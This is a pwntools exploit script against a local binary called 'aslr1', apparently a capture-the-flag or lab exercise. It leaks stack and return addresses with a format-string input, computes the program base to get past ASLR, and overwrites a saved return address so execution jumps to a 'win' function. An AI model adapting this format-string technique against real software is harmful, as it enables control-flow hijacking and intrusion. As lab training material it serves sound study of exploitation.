#!/bin/python

from pwn import *

context.clear(arch = 'amd64')
context.terminal = ['alacritty', '-e', 'sh', '-c']


MAIN_RETURN_OFFSET = 14;


e = ELF('./aslr1')

#io = gdb.debug('./aslr1', gdbscript = '''
#    b main
#    b vuln
#    c
#        ''')
io = process('./aslr1');

io.sendline(b'%134$llx %135$llx')
leak = io.recvline().decode('ASCII').split();

return_addr = int(leak[1], 16)
stack_addr = int(leak[0], 16)

ret_offset = e.symbols['main'] + MAIN_RETURN_OFFSET;

base_addr = return_addr - ret_offset;
win_addr = base_addr + e.symbols['win'];

log.info('Stack address: ' + hex(stack_addr))
log.info('Return address: ' + hex(return_addr))
log.info('Base address: ' + hex(base_addr))
log.info('Win address: ' + hex(win_addr))

payload = pwnlib.fmtstr.fmtstr_payload(6, { 
        (stack_addr - 8): win_addr,
    }, write_size='byte');

log.info('Payload: ' + str(payload));

io.sendline(payload);
io.sendline(b'q');

io.interactive()
